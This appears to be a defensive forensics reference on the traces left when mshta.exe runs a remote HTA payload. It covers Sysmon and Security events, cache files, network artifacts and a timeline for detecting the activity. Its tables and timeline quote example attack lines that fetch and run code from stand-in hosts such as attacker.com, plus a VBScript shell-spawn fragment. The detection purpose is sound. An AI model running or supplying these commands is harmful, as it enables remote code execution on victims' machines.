# LOLBins — mshta.exe — Target Evidence

What an operator running `mshta http://attacker.com/payload.hta` leaves on the victim host: process-execution records, network events, rendering engine artifacts, and the evidence signatures needed to detect or investigate the intrusion.

## Contents
- [Process Creation — Sysmon and Security Events](#process-creation--sysmon-and-security-events)
- [Internet Cache and Temporary Files](#internet-cache-and-temporary-files)
- [Network-Layer Artifacts](#network-layer-artifacts)
- [Script Engine Activity](#script-engine-activity)
- [Timeline Building](#timeline-building)

---

## Process Creation — Sysmon and Security Events

`mshta.exe` spawned directly from cmd.exe, PowerShell, or a macro generates process-creation events (Sysmon 1 or Security 4688):

| Event Details | Value | Notes |
|---|---|---|
| **Image** | `C:\Windows\System32\mshta.exe` or `C:\Windows\SysWOW64\mshta.exe` | The two legitimate OS install paths. |
| **CommandLine** | `mshta http://198.51.100.7/payload.hta` or `mshta \\attacker.com\share\payload.hta` | The exact command, including the URL/path — **strongest detection signal**. |
| **ParentImage** | `cmd.exe`, `powershell.exe`, macro parent (`WINWORD.EXE`, `EXCEL.EXE`), or C2 framework | Depends on delivery mechanism. |
| **OriginalFileName** | `MSHTA.EXE` | From the binary's version resource; survives renaming. |

**No child processes spawned by mshta itself** — all HTA script execution happens in-process. Any secondary process spawn (if the HTA's VBScript calls `CreateObject("WScript.Shell").Run("cmd.exe ...")`) appears as a direct child of mshta, not of the original parent that called mshta.

## Internet Cache and Temporary Files

The Trident rendering engine (IE engine hosted inside mshta) may cache the downloaded HTA:

| Artifact | Location | Notes |
|---|---|---|
| **IE cache** (Trident engine) | `C:\Users\[User]\AppData\Local\Microsoft\Windows\INetCache\` | The downloaded HTA may be cached here, named with an `index.dat` directory structure. Forensic tools (The Sleuth Kit, FTK) can recover cached files. |
| **Temporary files** | `%TEMP%`, `%USERPROFILE%\AppData\Local\Temp\` | The HTA rendering process may create temporary files. Depends on the HTA's own code. |
| **ADS cache** | Potentially on any file (if the attacker saved the HTA to an ADS) | Low probability but technically possible. |

## Network-Layer Artifacts

For remote HTA execution:

| Artifact | Source | Notes |
|---|---|---|
| **HTTP/HTTPS outbound request** | Proxy logs, firewall, Zeek, packet capture | A request for `payload.hta` with a `User-Agent` from mshta/IE (typically `Mozilla/4.0 ...` or `MSIEVersion/...`). The destination URL is the **strongest network signal**. |
| **DNS query** | Proxy logs, DNS logs | A DNS A/AAAA query for the attacker's domain occurs just before the HTTP request. |
| **TLS handshake** | Packet capture, proxy logs | If HTTPS, an SSL/TLS session to the destination on port 443 (or alternate HTTPS port). |

**UNC path execution** (`\\attacker.com\share\payload.hta`) produces:
- SMB connection (Event 5145 on the SMB server, Sysmon 3 on the client)
- No DNS query
- No HTTP/HTTPS

**Local file execution** (`C:\Users\Public\payload.hta`) produces:
- No network events

## Script Engine Activity

The embedded VBScript/JScript inside the HTA runs inside mshta's process via the Windows Script Host engine:

| Event Source | Details | Notes |
|---|---|---|
| **Sysmon Event 7 (Image Loaded)** | `jscript.dll`, `vbscript.dll` loaded into `mshta.exe` | A typical mshta process should load these; presence is expected but worth correlating with suspicious parent/command-line. |
| **Sysmon Event 1 (child process)** | If the HTA's script spawns a child (e.g., `CreateObject("WScript.Shell").Run("cmd.exe ...")`) | The child process has `mshta.exe` as parent — a rare and suspicious parent-child pair in most enterprises. |
| **Windows Event Log** (Event 4688, if PowerShell logging is enabled) | If the HTA spawns PowerShell | Evidence of the script spawn and PowerShell's own command line (if logged). |

## Timeline Building

A complete Mshta attack timeline:

**1. Initial Access** (not mshta-specific)
- Macro/phishing/script delivery

**2. Mshta Invocation**
- **Sysmon 1 / Security 4688:** `mshta http://attacker.com/payload.hta` (timestamp T0)
- **DNS query:** Domain lookup for attacker.com (T0-1 second)
- **Sysmon 3 / Security 5156:** Network connection from mshta.exe to attacker's web server (T0+1-2 seconds)

**3. HTA Download & Execution**
- **Sysmon 7 (Image Loaded):** `jscript.dll` or `vbscript.dll` loaded into mshta process (T0+2-5 seconds)
- **HTA window render:** HTA application window appears (if not hidden); UI elements render

**4. Script Execution & Payload Delivery**
- **Secondary network connections:** If the HTA's script downloads a C2 agent
- **Sysmon 1 (child process):** If the HTA's VBScript spawns cmd.exe/PowerShell

**5. Cleanup** (payload-dependent)
- C2 agent startup, persistence mechanisms, lateral movement
